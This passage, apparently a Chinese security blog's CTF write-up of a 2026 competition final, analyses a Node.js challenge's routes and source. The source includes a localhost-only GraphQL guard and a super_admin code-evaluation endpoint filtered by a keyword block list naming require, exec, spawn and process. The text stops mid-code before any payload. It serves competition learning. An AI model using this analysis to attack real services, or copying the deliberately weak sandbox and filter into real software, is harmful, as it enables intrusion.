@@ -1,0 +1,846 @@
+
+  <!DOCTYPE html>
+  <html lang="zh-CN"  >
+  <head>
+  <meta charset="utf-8">
+  
+
+  
+
+  
+
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_bq08450reo';window.REIMU_CONFIG.clipboard_tips = {"success":"复制成功(*^▽^*)","fail":"复制失败 (ﾟ⊿ﾟ)ﾂ","copyright":{"enable":false,"count":50,"content":"本文版权：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！"}};window.REIMU_CONFIG.code_block = {"expand":true};</script>
+  
+  <title>
+    CCB2026决赛复现 |
+    
+    KL
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+  
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_bq08450reo.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+  
+  
+    <meta name="description" content="好久没看CTF的题了，来恢复恢复  QLwist(SSRF打graphql+JWT算法混淆+vm沙箱逃逸)  题目分析    路径 作用     &#x2F;auth&#x2F;register 注册普通用户   &#x2F;auth&#x2F;login 登录，返回 JWT token   &#x2F;dashboard、&#x2F;profile 普通登录用户页面   &#x2F;admin 需要 admin 或 super_admin   &#x2F;admin&#x2F;sup">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CCB2026决赛复现">
+<meta property="og:url" content="http://example.com/2026/05/08/CCB2026%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:site_name" content="KL">
+<meta property="og:description" content="好久没看CTF的题了，来恢复恢复  QLwist(SSRF打graphql+JWT算法混淆+vm沙箱逃逸)  题目分析    路径 作用     &#x2F;auth&#x2F;register 注册普通用户   &#x2F;auth&#x2F;login 登录，返回 JWT token   &#x2F;dashboard、&#x2F;profile 普通登录用户页面   &#x2F;admin 需要 admin 或 super_admin   &#x2F;admin&#x2F;sup">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2026/05/08/CCB2026%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%8E%B0/CCB2026%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%8E%B0.assets/image-20260428161714730.png">
+<meta property="og:image" content="http://example.com/2026/05/08/CCB2026%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%8E%B0/CCB2026%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%8E%B0.assets/image-20260508150300727.png">
+<meta property="og:image" content="http://example.com/2026/05/08/CCB2026%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%8E%B0/CCB2026%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%8E%B0.assets/image-20260428162223921.png">
+<meta property="og:image" content="http://example.com/2026/05/08/CCB2026%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%8E%B0/CCB2026%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%8E%B0.assets/image-20260428164516696.png">
+<meta property="og:image" content="http://example.com/2026/05/08/CCB2026%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%8E%B0/CCB2026%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%8E%B0.assets/image-20260428164838033.png">
+<meta property="og:image" content="http://example.com/2026/05/08/CCB2026%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%8E%B0/CCB2026%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%8E%B0.assets/image-20260428170333422.png">
+<meta property="og:image" content="http://example.com/2026/05/08/CCB2026%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%8E%B0/CCB2026%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%8E%B0.assets/image-20260428170349273.png">
+<meta property="article:published_time" content="2026-05-08T03:20:44.000Z">
+<meta property="article:modified_time" content="2026-05-08T07:23:31.686Z">
+<meta property="article:author" content="FuB0Y">
+<meta property="article:tag" content="比赛复现">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2026/05/08/CCB2026%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%8E%B0/CCB2026%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%8E%B0.assets/image-20260428161714730.png">
+  
+  
+    <link rel="alternate" href="/atom.xml" title="KL" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+  
+    
+      
+        
+<link rel="stylesheet" href="https://npm.webcache.cn/katex@0.16.11/dist/katex.min.css">
+
+      
+    
+  
+  
+  
+  
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+  
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.0/dist/aos.css">
+
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+  <body>
+    
+  <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi">
+        
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+        
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    var endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script>
+
+<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+</div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav">
+    
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/">首页</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/archives">归档</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/about">关于</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/friend">友链</a>
+        </span>
+      
+    
+    <a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav">
+    
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅" target="_blank"></a>
+    
+    
+    
+  </nav>
+</div>
+<header id="header">
+  
+    <picture>
+      
+    </picture>
+    
+      <img fetchpriority="high" src="/images/banner.webp" alt="CCB2026决赛复现">
+    
+  
+  <div id="header-outer">
+    <div id="header-title">
+      
+        
+        
+          <a href="/" id="logo">
+            <h1 data-aos="slide-up">CCB2026决赛复现</h1>
+          </a>
+        
+      
+      
+        
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content"  class="sidebar-right" >
+          <aside id="sidebar">
+  
+  
+  <div class="sidebar-wrapper wrap-sticky">
+    <div class="sidebar-wrap" data-aos="fade-up">
+      
+        <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#qlwistssrf%E6%89%93graphqljwt%E7%AE%97%E6%B3%95%E6%B7%B7%E6%B7%86vm%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8"><span class="toc-number">1.</span> <span class="toc-text"> QLwist(SSRF打graphql+JWT算法混淆+vm沙箱逃逸)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90"><span class="toc-number">1.1.</span> <span class="toc-text"> 题目分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF"><span class="toc-number">1.2.</span> <span class="toc-text"> 解题思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98"><span class="toc-number">1.3.</span> <span class="toc-text"> 解题</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8"><span class="toc-number">1.3.1.</span> <span class="toc-text"> 沙箱逃逸</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%BC%82%E6%AD%A5%E7%89%B9%E6%80%A7"><span class="toc-number">1.3.1.1.</span> <span class="toc-text"> 异步特性</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%97%B6%E5%BA%8F%E7%BB%95%E8%BF%87"><span class="toc-number">1.3.1.2.</span> <span class="toc-text"> 时序绕过</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#javaunboundcc%E9%93%BEscriptenginemanager%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8Cbcel%E5%AD%97%E8%8A%82%E7%A0%81%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">2.</span> <span class="toc-text"> JavaUnbound(CC链+ScriptEngineManager代码执行&#x2F;BCEL字节码+内存马)</span></a></li></ol>
+      
+  </div>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="FuB0Y" class="lazyload">
+  <div class="sidebar-author-name">FuB0Y</div>
+  <div class="sidebar-description">世所谓英雄者，不以挫抑而灰心，不以失败而退怯</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">396</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">13</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">327</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+      
+      
+        <div class="sidebar-btn-wrapper" style="position:static">
+          <div class="sidebar-toc-btn current"></div>
+          <div class="sidebar-common-btn"></div>
+        </div>
+      
+    </div>
+  </div>
+
+  <div class="sidebar-widget">
+  
+  </div>
+</aside>
+
+          <section id="main"><article id="post-CCB2026决赛复现" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <a href="/2026/05/08/CCB2026%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%8E%B0/" class="article-date-link" data-aos="zoom-in">
+    <time datetime="2026-05-08T03:20:44.000Z" itemprop="datePublished">2026-05-08</time>
+    <time style="display: none;" id="post-update-time">2026-05-08</time>
+  </a>
+</div>
+
+      
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/" data-aos="zoom-in">比赛复现</a>
+  </div>
+
+
+    </div>
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+      
+        <p>好久没看CTF的题了，来恢复恢复</p>
+<h2 id="qlwistssrf打graphqljwt算法混淆vm沙箱逃逸"><a class="markdownIt-Anchor" href="#qlwistssrf打graphqljwt算法混淆vm沙箱逃逸"></a> QLwist(SSRF打graphql+JWT算法混淆+vm沙箱逃逸)</h2>
+<h3 id="题目分析"><a class="markdownIt-Anchor" href="#题目分析"></a> 题目分析</h3>
+<table>
+<thead>
+<tr>
+<th>路径</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>/auth/register</code></td>
+<td>注册普通用户</td>
+</tr>
+<tr>
+<td><code>/auth/login</code></td>
+<td>登录，返回 JWT token</td>
+</tr>
+<tr>
+<td><code>/dashboard</code>、<code>/profile</code></td>
+<td>普通登录用户页面</td>
+</tr>
+<tr>
+<td><code>/admin</code></td>
+<td>需要 <code>admin</code> 或 <code>super_admin</code></td>
+</tr>
+<tr>
+<td><code>/admin/super</code></td>
+<td>需要 <code>super_admin</code></td>
+</tr>
+<tr>
+<td><code>/admin/super/evaluate</code></td>
+<td><code>super_admin</code> 才能调用的 JS 表达式执行器</td>
+</tr>
+<tr>
+<td><code>/api/link-check</code></td>
+<td>登录用户可以让服务器去访问一个 URL</td>
+</tr>
+<tr>
+<td><code>/graphql</code></td>
+<td>GraphQL API，但限制只能本机访问</td>
+</tr>
+</tbody>
+</table>
+<p><strong>依赖导入：</strong></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; <span class="title class_">ApolloServer</span> &#125; = <span class="built_in">require</span>(<span class="string">&#x27;@apollo/server&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; expressMiddleware &#125; = <span class="built_in">require</span>(<span class="string">&#x27;@apollo/server/express4&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> rateLimit = <span class="built_in">require</span>(<span class="string">&#x27;express-rate-limit&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> cookieParser = <span class="built_in">require</span>(<span class="string">&#x27;cookie-parser&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&#x27;vm&#x27;</span>);  <span class="comment">// 用于安全执行 JavaScript 代码</span></span><br><span class="line"><span class="keyword">const</span> &#123; typeDefs, resolvers, <span class="variable constant_">USERS</span>, hashPw &#125; = <span class="built_in">require</span>(<span class="string">&#x27;./schema&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; verifyToken, signToken &#125; = <span class="built_in">require</span>(<span class="string">&#x27;./auth&#x27;</span>);</span><br></pre></td></tr></table></figure>
+<p><strong>Express 中间件配置</strong></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">json</span>(&#123; <span class="attr">limit</span>: <span class="string">&#x27;20mb&#x27;</span> &#125;));</span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">urlencoded</span>(&#123; <span class="attr">extended</span>: <span class="literal">true</span> &#125;));</span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">cookieParser</span>());</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>);</span><br></pre></td></tr></table></figure>
+<p><strong>认证中间件</strong></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">authMiddleware</span>(<span class="params">req, _res, next</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> header = req.<span class="property">headers</span>[<span class="string">&#x27;authorization&#x27;</span>] || <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="keyword">const</span> token = header.<span class="title function_">replace</span>(<span class="regexp">/^Bearer\s+/i</span>, <span class="string">&#x27;&#x27;</span>).<span class="title function_">trim</span>()</span><br><span class="line">              || req.<span class="property">cookies</span>?.<span class="property">token</span>;</span><br><span class="line">  req.<span class="property">user</span> = token ? <span class="title function_">verifyToken</span>(token) : <span class="literal">null</span>;</span><br><span class="line">  <span class="title function_">next</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>从 <strong>Authorization header</strong>（Bearer token）或 <strong>Cookie</strong> 中提取 JWT</li>
+<li>验证 token 后将用户信息挂载到 <code>req.user</code></li>
+</ul>
+<p><strong>角色权限控制</strong></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">requireRole</span>(<span class="params">...allowedRoles</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">user</span> || !allowedRoles.<span class="title function_">includes</span>(req.<span class="property">user</span>.<span class="property">role</span>)) &#123;</span><br><span class="line">      <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">json</span>(&#123; <span class="attr">error</span>: <span class="string">&#x27;Forbidden&#x27;</span> &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">next</span>();</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>高阶函数，返回中间件，检查用户角色是否在白名单中</li>
+<li>支持多角色：如 <code>requireRole('admin', 'super_admin')</code></li>
+</ul>
+<p><strong>最重要的：GraphQL API 安全配置</strong></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> gqlLimiter = <span class="title function_">rateLimit</span>(&#123;</span><br><span class="line">  <span class="attr">windowMs</span>: <span class="number">60</span> * <span class="number">1000</span>,  <span class="comment">// 1分钟窗口</span></span><br><span class="line">  <span class="attr">max</span>: <span class="number">10</span>,              <span class="comment">// 最多10次</span></span><br><span class="line">  <span class="attr">skip</span>: <span class="function">(<span class="params">req</span>) =&gt;</span> &#123;      <span class="comment">// 跳过 Query 请求的限流</span></span><br><span class="line">    <span class="comment">// 只对 mutation 限流，query 不限流</span></span><br><span class="line">    <span class="keyword">return</span> req.<span class="property">body</span>?.<span class="property">query</span>?.<span class="title function_">toLowerCase</span>().<span class="title function_">startsWith</span>(<span class="string">&#x27;query&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line">app.<span class="title function_">use</span>(<span class="string">&#x27;/graphql&#x27;</span>, <span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// 1. IP 白名单限制</span></span><br><span class="line">  <span class="keyword">const</span> ip = req.<span class="property">ip</span> || req.<span class="property">socket</span>?.<span class="property">remoteAddress</span> || <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="keyword">if</span> (![<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="string">&#x27;::1&#x27;</span>, <span class="string">&#x27;::ffff:127.0.0.1&#x27;</span>].<span class="title function_">includes</span>(ip)) &#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">json</span>(...);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 2. 禁止批量请求</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="title class_">Array</span>.<span class="title function_">isArray</span>(req.<span class="property">body</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">json</span>(...);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 3. 禁止自省查询（introspection）</span></span><br><span class="line">  <span class="keyword">const</span> query = req.<span class="property">body</span>?.<span class="property">query</span> || <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="keyword">if</span> (<span class="regexp">/__schema\b/i</span>.<span class="title function_">test</span>(query)) &#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">json</span>(...);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="title function_">next</span>();</span><br><span class="line">&#125;, gqlLimiter, <span class="title function_">expressMiddleware</span>(apollo, ...));</span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>GraphQL 端点仅允许本地访问</strong>（127.0.0.1）</li>
+<li>禁用内省查询防止泄露 schema</li>
+<li>禁用批量请求避免攻击</li>
+</ul>
+<p><strong>用户认证路由</strong></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/auth/login&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; username, password &#125; = req.<span class="property">body</span>;</span><br><span class="line">  <span class="keyword">const</span> user = <span class="variable constant_">USERS</span>[username];</span><br><span class="line">  <span class="keyword">if</span> (!user || user.<span class="property">passwordHash</span> !== <span class="title function_">hashPw</span>(password)) &#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">401</span>).<span class="title function_">json</span>(&#123; <span class="attr">error</span>: <span class="string">&#x27;Invalid credentials&#x27;</span> &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">const</span> token = <span class="title function_">signToken</span>(&#123; username, <span class="attr">role</span>: user.<span class="property">role</span> &#125;);</span><br><span class="line">  res.<span class="title function_">json</span>(&#123; token, username, <span class="attr">role</span>: user.<span class="property">role</span> &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+<p>注册：</p>
+<ul>
+<li>不允许注册 <code>admin</code> 用户名</li>
+<li>新用户默认为 <code>user</code> 角色</li>
+</ul>
+<p><strong>页面路由</strong></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/dashboard&#x27;</span>, ...)     <span class="comment">// 普通用户仪表盘</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/profile&#x27;</span>, ...)       <span class="comment">// 个人资料页</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/admin&#x27;</span>, <span class="title function_">requireRole</span>(<span class="string">&#x27;admin&#x27;</span>, <span class="string">&#x27;super_admin&#x27;</span>), ...)  <span class="comment">// 管理员页面</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/admin/super&#x27;</span>, <span class="title function_">requireRole</span>(<span class="string">&#x27;super_admin&#x27;</span>), ...)     <span class="comment">// 超级管理员页面</span></span><br></pre></td></tr></table></figure>
+<p><strong>代码执行功能</strong></p>
+<p>存在黑名单吗，且表达式长度 限制4096</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">const</span> <span class="variable constant_">EXPR_DISALLOWED</span> = [</span><br><span class="line">    <span class="string">&#x27;prototype&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;require&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;spawn&#x27;</span>, <span class="string">&#x27;child&#x27;</span>, <span class="string">&#x27;process&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;module&#x27;</span>, <span class="string">&#x27;binding&#x27;</span>, <span class="string">&#x27;dlopen&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;global&#x27;</span>, <span class="string">&#x27;import&#x27;</span>,</span><br><span class="line">  ];</span><br><span class="line"></span><br><span class="line"> <span class="keyword">function</span> <span class="title function_">validateExpression</span>(<span class="params">code</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> token <span class="keyword">of</span> <span class="variable constant_">EXPR_DISALLOWED</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (code.<span class="title function_">includes</span>(token)) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/admin/super/evaluate&#x27;</span>, <span class="title function_">requireRole</span>(<span class="string">&#x27;super_admin&#x27;</span>), <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; expression &#125; = req.<span class="property">body</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> expression !== <span class="string">&#x27;string&#x27;</span> || expression.<span class="property">length</span> &gt; <span class="number">4096</span>) 